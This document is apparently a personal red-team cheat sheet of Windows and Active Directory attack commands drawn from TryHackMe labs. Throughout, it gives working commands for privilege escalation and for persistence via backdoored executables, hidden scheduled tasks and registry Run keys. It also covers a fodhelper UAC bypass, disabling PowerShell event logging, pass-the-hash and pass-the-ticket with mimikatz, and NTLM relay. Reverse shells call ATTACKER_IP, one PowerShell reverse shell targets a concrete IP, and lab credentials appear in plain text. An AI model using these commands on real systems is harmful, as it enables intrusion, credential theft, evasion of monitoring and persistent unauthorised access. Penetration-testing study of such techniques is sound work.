## I just landed where the **** I AM ?
# Nestat
`netstat -na`
# Arp table (These IP have communicated with our system, Could be LAN or not)
`arp -a`
# Am in domain
`systeminfo | findstr Domain`
# General system information like OS version
`systeminfo`
# Whats my IP + extra info as DNS servers 
`ipconfig /all`
# IPs,Ports,Processes Corellation
`netstat -abno`
# My priviledges
`whoami /priv`
# My group
`whoami /groups`
# SMB shares
`net share`
# Other users
`net user`
# Find groups if i am in domain controller
`net group`
# Find groups 
`net localgroup `
# Users belong to administrator group
`net localgroup administrators`
# Find local settings, about password lenght, age etc
`net accounts`
# Find settings about passwords and etc (if domain controller)
`net accounts /domain`
# Enumerate users in domain
`Get-ADUser -Filter *`
`net user /domain`
`net user zoe.marshall /domain`*Specific details about user*
# Enumerate groups in domain
`net group /domain`
`net group "Tier 1 Admins" /domain`*Members of the group*
# Passwords policy
`net accounts /domain`


# Enumerate users through ldap
`Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"`
*Using the SearchBase option, we specify a specific Common-Name CN,The DN consists of Domain Component (DC), OrganizationalUnitName (OU), Common Name (CN)*
# List user accounts within THM OU in the thmredteam.com Domain
`Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREADTEAM,DC=COM"`
# AV awareness-detection with wmic
`wmic /namespace:\\root\securitycenter2 path antivirusproduct`
# AV awareness-detection with pure-powershell
`Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct`*Windows servers may not have SecurityCenter2 namespace, but workstations have*
# Processes
`Get-Process`
# Owner of a directory
`Get-Acl c:/`
# View the permissions set on a directory
`icacls <directory>` 
# Grant a user full permissions to a directory
`icacls c:\users /grant joe:f` 
# Remove a users' permissions on a directory
`icacls c:\users /remove joe` 
# pwd
`Get-Location`
# Users with password off
`Get-LocalUser | Where-Object -Property PasswordRequired -Match false`
# Local groups
`Get-LocalGroup`
# Ports Listenning
`Get-NetTCPConnection | Where-Object -Property state -Match Listen `
# check installed updates
`wmic qfe get Caption, Description`
# Patches applied
`Get-HotFix`
`Get-Hotfix -Id KB4023834`
# Schedule Tasks
`Get-ScheduledTask -TaskName new-sched-task`
`schtasks /query /tn vulntask /fo list /v`
# Find a file in the computer
`Get-ChildItem -Path C:\ -Include *interesting-fle.txt* -File -Recurse -ErrorAction SilentlyContinue`
# Get Contents of file
`Get-Content "C:\Program Files\interestingfile.txt.txt"`

###### Privilege escalation #########
# Powershell history
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
# IIS Configuration file (passwords for databases)
`type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`
# Retrieve Credentials from PuTTY 
`reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`

# Scheduled Tasks
List Scheduled tasks 
`schtasks /query /tn vulntask /fo list /v`
Check the file permissions (if we can modify or overwite)
`icacls c:\tasks\schtask.bat`
Modify the file and insert the payload
`echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`
# Run the task
`schtasks /run /tn vulntask`

# Unquoted Service Paths
`Get-WmiObject win32_service | select Name, DisplayName, State, PathName`
*(If we find find a Path to an executable with spaces that is unqoted we win)*
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe`*Generate the service executable*
`move C:\Users\thm-unpriv\reverse-svc2.exe C:\MyPrograms\Disk.exe` Move the reverseshell service to the first unqoted directory that you find in the path.
# Restart the service
`sc stop "disk sorter enterprise"
 sc start "disk sorter enterprise"`

# SeBackup / SeRestore (Pass the hash through SMB share and Registry dump)
*The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place.*
`reg save hklm\system C:\Users\THMBackup\system.hive`
`reg save hklm\sam C:\Users\THMBackup\sam.hive` *Dump the registry SAM and SYSTEM hashes*
`mkdir share`
`python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share`*Create a share between the machines*
`copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\`
`copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\` *Copy the files to the share*
`python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL`*Use impacket to retrieve the users' password hashes*
`python3.9 /opt/impacket/examples/psexec.py -hashes `*Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges*
# RID Hijacking
`wmic useraccount get name,sid` Check the SID (Remember 500 is admin)
`PsExec64.exe -i -s regedit` *Run regedit as System through PsExec*
**From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called F, which holds the user's effective RID. Notice the RID is stored using little-endian notation, so its bytes appear reversed. We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):**


###### Persistence #########
`net localgroup administrators thmuser0 /add`
`net localgroup "Remote Management Users" thmuser1 /add`

# Backdooring files
`msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe`

# Persisting through services
`sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto `*Create a service*

# Create Services with rev shell

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice`

# Replaces Service executables

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe`
`sc.exe query state=inactive` *Find the STOPPED Services*
`sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"` *Configure it with autostart, and replace the binary with Ours*

# Scheduled Tasks

` schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM` *Create a task*
`c:\tools\pstools\PsExec64.exe -s -i regedit` *Open regedit with psexec*
`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\` *Navigate there and find the Schedule task that we created and delete the Security Descriptor (SD), by doing this our schedule task is invisible to everyone*


# StartUp
`C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`*Place your file here for user persistence*
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` *Global persistence*

# Registry persistence
*Open registry with regedit and adequate perms*
`HKCU\Software\Microsoft\Windows\CurrentVersion\Run` *Runs every time for the current user*
`HKLM\Software\Microsoft\Windows\CurrentVersion\Run` *Runs every time for every user*
**New -> Expandable String Value -> In the Data Section write your path to the executable,Name it as you want**

# Winlogon One method
`HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`
*Userinit points to userinit.exe, which is in charge of restoring your user profile preferences.
Shell points to the system's shell, which is usually explorer.exe)*
(Interestingly, you can append commands separated by a comma, and Winlogon will process them all.)

# Winlogon Two method
*One of the things userinit.exe does while loading your user profile is to check for an environment variable called UserInitMprLogonScript. Go to `HKCU\Environment` in the registry. New -> Expandable String Value. Name it as UserInitMprLogonScript*



#### UAC BYPASS METHODS(Run from cmd, to bypass defender) ####
`whoami /groups | find "Label"` *We want high integrity if we want to have admin perms on a process no matter if we are already an admin.If we have medium do the following* 
`set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"`
`reg add "HKCU\Software\Classes\.Servic3\Shell\Open\command" /d %CMD% /f`
`reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".Servic3" /f`
`fodhelper.exe`
`reg delete "HKCU\Software\Classes\.Servic3\" /f`
`reg delete "HKCU\Software\Classes\ms-settings\" /f`

#### Evading logging ####
# Disable Event Tracing Windows provider ( create a .ps1 and Invoke-Obfuscation)
`$logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')`
`$etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)`
`[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue($etwProvider,0);`
# GPO takeover (create a .ps1 and Invoke-Obfuscation)
**Disable only what hurts us : 4103-Logs command invocation(module logging), 4104-Logs script block execution**
`$GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static')`
`$GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)`
`$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0`
`$GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0`
# Abusing Log Pipeline
**Disable module loggin (4103-Logs command invocation) for a particular session**
`$module = Get-Module Microsoft.PowerShell.Utility # Get target module
$module.LogPipelineExecutionDetails = $false # Set module execution details to false
$snap = Get-PSSnapin Microsoft.PowerShell.Core # Get target ps-snapin
$snap.LogPipelineExecutionDetails = $false # Set ps-snapin execution details to false`


# Same machine Port enumeration
`
for($i=130; $i -le 140; $i++){
    Test-NetConnection localhost -Port $i
}
`
`Start-Process
Get-Process -name notepad
Copy-Item
Move-Item
`
# Download files
`Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"` | Download - Invoke-WebRequest using a Chrome User Agent
`(New-Object System.NetWebClient).Downloadfile('http://') | IEX`  *Fileless due to Invoke Expression*
`Invoke-WebRequest "http:///" -OutFile "kati.ps1" `
`certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe`
`bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe c:\Users\thm\Desktop\payload.exe` 
`findstr /V dummystring \\MachineName\ShareFolder\test.exe > c:\Windows\Temp\test.exe` | Download from smb shared folder
`scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe` | Download a file using SCP
# Upload Files
`scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP
`(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

# Signed Binary Proxy Execution - Indirect Command Execution
`explorer.exe /root,"C:\Windows\System32\calc.exe"` (Indirect Command Execution)
`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://AttackBox_IP/script.ps1');");`(Signed Binary Proxy Execution: Rundll32)

# Bypassing Application Whitelisting (Regsvr32- DLL)
`c:\Windows\System32\regsvr32.exe c:\Users\thm\Downloads\live0fftheland.dll` *First Option*
`c:\Windows\System32\regsvr32.exe /s /n /u /i:http://example.com/file.sct Downloads\live0fftheland.dll` *More advanced - Second Option*

# Run powershell with MSBuild! NO powershell.exe (Can also exec shellcode the same way)
`git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git`
`msfvenom -p windows/meterpreter/reverse_winhttps LHOST=AttackBox_IP LPORT=4443 -f psh-reflection > liv0ff.ps1`
`msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost AttackBox_IP;set lport 4443;exploit"`
`python2 PowerLessShell.py -type powershell -source /tmp/liv0ff.ps1 -output liv0ff.csproj`
`c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\Users\thm\Desktop\liv0ff.csproj`

# ExecutionPolicy Bypass
`powershell -ExecutionPolicy Bypass -File .\kati`

# Other machine discovery 
`1..255 | %{echo "10.0.2.$_"; ping -n 1 10.10.168.$_ | Select-String ttl}`

# Other machines Open ports
`1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.2.8", $_)) "Open port on - $_"} 2>$null`

# Powerview
`
powershell -ExecutionPolicy bypass -file .\powerview.ps1
Import-Module .\powerview.ps1
Get-NetUser -Properties description
Get-NetUser -Properties useraccountcontrol
Get-NetUser -Properties useraccountcontrol | findstr ACCOUNTDISABLE
Get-NetGroupMember “Domain Admins”
Find-DomainShare
Get-NetGPO
`
MS Defender works in three protection modes: Active, Passive, Disable modes.Active mode is used where the MS Defender runs as the primary antivirus software on the machine where provides protection and remediation. Passive mode is run when a 3rd party antivirus software is installed. Therefore, it works as secondary antivirus software where it scans files and detects threats but does not provide remediation. Finally, Disable mode is when the MS Defender is disabled or uninstalled from the system.
# Check the service state for windows
`Get-Service WinDefend`
# Check to see the option that enabled or disable on AV
`Get-MpComputerStatus`
Optional: `| select RealTimeProtectionEnabled`
# Lets check about Firewall
`Get-NetFirewallProfile`
Optional quick check:`| Format-Table Name, Enabled`
# Check about firewall rules
`Get-NetFirewallRule | select DisplayName, Enabled, Direction , Action`
# Disable Firewall profile (if admin perms)
`Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False`
# Test connections for (inbound connection-ports open-other computers in the network)
`Test-NetConnection -ComputerName 127.0.0.1 -Port 80`
`(New-Object System.Net.Sockets.TcpClient("127.0.0.1","80").Connected)`
# Get Event logs (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-eventlog?view=powershell-5.1)
`Get-EventLog -List`
*Through this we can get an insight of what applications and services run on the machine*
# Check if sysmon is present on our machine (So potentially logging things)
`Get-Process | Where-Object { $_.ProcessName -eq "Sysmon"}`
`Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"`
`Get-Service | where-object {$_.DisplayName -like "*sysm*"}`
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational`
# Find the sysmon configuration file (So as to see what is being monitored, BECAREFULL IT MAY TRIGGER AV)
`findstr /si '<ProcessCreate onmatch="exclude">' C:\*`
# EDR checker
https://github.com/PwnDexter/SharpEDRChecker
# Check for installed applications and versions
`wmic product get name,version,vendor`
# Check for running Services
`net start`
# Find Specific service of interest
`wmic service where "name like 'THM Service'" get name,PathName`
`Get-Process -Name thm-service`
`nestat -aon |findstr "LISTENING" | findstr "3212"`
# DNS zone transfer
`nslookup.exe
server myIp
ls -d DomainName`
**or**
`dig -t AXFR DOMAIN_NAME @DNS_SERVER` **The -t AXFR indicates that we are requesting a zone transfer, while @ precedes the DNS_SERVER that we want to query regarding the records related to the specified DOMAIN_NAME**
# Simple Network Management Protocol (SNMP) [Need more tools like snmpwalk to add to this toolset]
*Designed to help collect information about different devices on the network.*
`git clone https://gitlab.com/kalilinux/packages/snmpcheck.git
cd snmpcheck/
gem install snmp
chmod +x snmpcheck-1.9.rb
snmpcheck.rb 10.10.235.90 -c COMMUNITY_STRING`
*or*
`snmpwalk -v1 -c public 10.10.114.235`
**Community string is default some times to Public, but it can be found on other devices like routers and etc.The “SNMP community string” is like a user ID or password that allows access to a router's or other device's statistics.**

# Force GPO sync
`gpupdate /force`


# LDAP Pass-back Attacks
LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters are specified.We can alter the LDAP configuration, such as the IP or hostname of the LDAP server to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

# Setup an LDAP server
`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd`
`sudo dpkg-reconfigure -p low slapd`
*Omit OpenLDAP server configuration -> No*
*DNS domain name,Organisation name -> Attacking.domain.com*
*Provide admin pass*
*Remove when purged -> No*
*Move old Database-> yes*

# Make our server to only support PLAIN and LOGIN authentication methods
*Create a file with name -> olcSaslSecProps.ldif*
*Write that in file*
`
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
`
`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart`*Configure*
`sudo tcpdump -SX -i eth0 tcp port 389`*Capture traffic on ldap server and check the credentials*


# Responder
Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected. On large Windows networks, hosts can first attempt to determine if the host they are looking for is on the same local network by sending out LLMNR requests and seeing if any hosts respond.Responder will actively listen to the requests and send poisoned responses telling the requesting host that our IP is associated with the requested hostname. In the same line, it starts to host several servers such as SMB, HTTP, SQL, and others to capture these requests and force authentication. 
`sudo responder -I tun0`

# PXE Boot - LAPS (https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/)

# Enumeration with Seatbelt (https://github.com/GhostPack/Seatbelt)

# Runas (not domain joined )
When the PC is not joined to the domain and we have AD credentials we can use Runas to inject the credentials into memory.So commands executed locally on the computer will run in the context of your standard Windows account, but any network connections will occur using the domain account specified. 
`runas.exe /netonly /user:<domain>\<username> cmd.exe`

# Setup DNS in case its not automatically done (Powershell)
`$dnsip = "<DC IP>"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip` *Most of the times DC will be the dns server*

# SYSVOL 
`dir \\za.tryhackme.com\SYSVOL`*Kerberos authentication*
`dir \\<DC IP>\SYSVOL ` *Stealthier NTLM authentication*

###############################################
ssh za.tryhackme.com\\grace.brooks@thmjmp1.za.tryhackme.com -> Vrgr6062
xfreerdp /v:thmjmp1.za.tryhackme.com /u:grace.brooks /d:za.tryhackme.com /p:Vrgr6062 /dynamic-resolution


################################################

## Install RSAT Tools and perform enumeration

`Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online` *Install them*
# Enumerate user
`Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *`
# Enumerate Groups
`Get-ADGroup -Identity Administrators -Server za.tryhackme.com`
# ENumerate group membership
`Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com`

# Sharphound
`.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
` *Collect all but do not touch domain controllers- Theoretically evasive*
`neo4j console` Start neo4j
`bloodhound`

# PSexec (remote command exec)
    Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.
    Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with C:\Windows\psexesvc.exe.
    Create some named pipes to handle stdin/stdout/stderr.

`psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe`

### Common code for the above tecniques
`$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;`

`smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever` *Upload what you want to execute on the shares (depends on the method you choose)*

# WinRM remote exec(required: Remote Management Users group- 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS))
`winrs.exe -u:Administrator -p:Mypass123 -r:target cmd` *One way*
`Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}`

# WMI remote powershell through DCOM (port 135/TCP and ports 49152-65535/TCP)
`$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop`

# WMI remote Process Creating
`$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
CommandLine = $Command
}`

# WMI remote services
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "THMService2";
DisplayName = "THMService2";
PathName = "net user munra2 Pass123 /add"; # Your payload
ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
StartMode = "Manual"
}
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete`

# WMI remote scheduled tasks
`$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"
$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"`
# WMI remote MSI installation
`Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}`

# sc.exe (Remote services)
`sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto`
`sc.exe \\TARGET start THMservice`
`sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice`

# Schedule task (remote run)
`schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 `
`schtasks /s TARGET /run /TN "THMtask1" `
`schtasks /S TARGET /TN "THMtask1" /DELETE /F`

## PASS THE HASH
# PTH with mimikatz
*Admin privs*
`privilege::debug`
`token::elevate`
`sekurlsa::msv`
`token::revert`
`sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"`*if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH*

# PTH RDP
`xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`
# PTH ps.exec
`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`(linux version)
# PTH evil-winrm
`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`


## PASS THE TICKET
*TGT cant be exported with admin priv, TGS with low priv*
`privilege::debug`
`sekurlsa::tickets /export`
`kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
`*inject the ticket in the current session*
`klist`*Running this in powershell will show cached-injected cred*


## PASS THE KEY
`privilege::debug`
`sekurlsa::ekeys`
`sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"`*When using RC4 instead of AES and etc, the key will be equal to the NTLM hash,we can use it to request a TGT- Known as Overpass-the-Hash (OPtH)*

# RDP hijacking(without password before Windows server 2019)
`PsExec64.exe -s cmd.exe`*Get system priv*
`query user` *Check for State :disc*
`tscon 3 /dest:rdp-tcp#6`*Session 3 with is disc should be connected to our: tcp#6*

# Reverse Shell 

`$client = New-Object System.Net.Sockets.TCPClient('10.50.112.55',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
` 

# Permission Delegation (ACE's)
https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#

    ForceChangePassword: We have the ability to set the user's current password without knowing their current password.
    AddMembers: We have the ability to add users (including our own account), groups or computers to the target group.
    GenericAll: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
    GenericWrite: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs on.
    WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
    WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
    AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

## AD-RSAT for permision delegation
# Add-ADGroupMember 
`$user = Get-ADUser -Identity 'user.name'
$group = Get-ADGroup -Identity 'IT Support'
Add-ADGroupMember -Identity $group -Members $user
Get-ADGroupMember -Identity $group`

# Check the members of a group
`Get-ADGroupMember -Identity "IT Support`

# # Pick a random T2 account to target
`$t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1`

# Change the password
`$password = 'strong.pass1' | ConvertTo-SecureString -AsPlainText -Force
Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password`

**If you get an access denied error, your membership of the IT Support group have not fully replicated through the network yet. Try running gpupdate /force or wait a few minutes and try again.**

## Kerberos unconstrained delegation computers
# Enumeration for delegation(AD-RSAT)
`Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description`

# Powerview find for delegations
`Import-Module C:\Tools\PowerView.ps1 `
`Get-NetUser -TrustedToAuth` *full enumeration! userprincipalname: (the service), msds-allowedtodelegateto: (the services it can delegate)*

# Check for if potential service exists so we can dump cred later on 
`Get-CimInstance -ClassName Win32_Service | Where-Object {$_.StartName -like 'svcIIS*'} | Select-Object *`**

# MIMIKATZ: Dump clear text credentials (for services)from registry
`mimikatz # token::elevate`*Elevate System privs*
`mimikatz # lsadump::secrets`*Dump clear text cred from registry for features such as Windows services*
`mimikatz # token::revert`*revert the priv*

# kekeo: Generate TGT for services
`tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted`
*user - The user who has the constrained delegation permissions.
domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
password - The password associated with the svcIIS account.*


# kekeo: Generate TGS (for both services)
`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http`
`tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc`

# mimikatz  import the two TGS
`mimikatz # privilege::debug`
`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`

`kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi`

# Check if the PSsession exists
`New-PSSession -ComputerName thmserver1.za.tryhackme.loc`

# Get RCE on the server
`Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc`


## Authentication relays

Therefore, to exploit this, apart from machine account administrative privileges, we also need to meet the following four conditions :

    A valid set of AD account credentials.
    Network connectivity to the target's SMB service.
    The target host must be running the Print Spooler service.
    The hosts must not have SMB signing enforced.

# Enumerate for Print Spoller service
`GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
` *or*
`Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc`

# Ensure SMB signing is not enforced
`nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc`

# Find the IP of the server
`dig thmserver1.za.tryhackme.loc`

# Setup NTLM relay
`python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug`

# Coerce A server to authenticate to us (we are on thmwrk1)        
`C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"`

# Get hash dump from server1 (i think xD)
` python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP"`


## Exploiting GPOs

# Adding an AD account we control to both the local Administrators and local Remote Desktop Users groups.

`C:\>runas /netonly /user:za.tryhackme.loc\<AD Username> cmd.exe`*inject the AD user's credentials into memory using the runas command*

`C:\>mmc`*open MMC to modify the GPO*

We now want to add the Group Policy Management snap-in:

    Click File -> Add/Remove Snap-in
    Select the Group Policy Management snap-in and click Add
    Click Ok

You should now be able to see GPOs for the za.tryhackme.com domain:
We can now navigate to the GPO that our user has permission to modify (Servers > Management Servers> Management Server Pushes).
We can right-click on the GPO and select Edit. This will open the new Group Policy Management Editor window.
In order to add our account to the local groups, we need to perform the following steps:

    Expand Computer Configuration
    Expand Policies
    Expand Windows Settings
    Expand Security Settings
    Right Click on Restricted Groups and select Add Group (If the IT Support group already exists, it means someone has already performed the exploit. You can either delete it to create it yourself, or just inspect it to see what was configured.)
    Click Browse, enter IT Support and  click Check Names
    Click Okay twice
The first filter is not used. For the second filter, we want to add both the Administrators and Remote Desktop Users groups. 
Once the configuration has been made, we can click Apply and OK. Now, all we need to do is wait for a maximum of 15 minutes for the GPO to be applied. After this, our initial account that we made a member of the IT Support group will now have administrative and RDP permissions on THMSERVER2!

## Bloodhound extra queries
# Bloodhound custom query to find admin access from one machine to another
`MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p`
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/tools/bloodhound
https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/
https://github.com/ZephrFish/Bloodhound-CustomQueries
https://github.com/hausec/Bloodhound-Custom-Queries


## Finding Vulnerable Certificate Templates

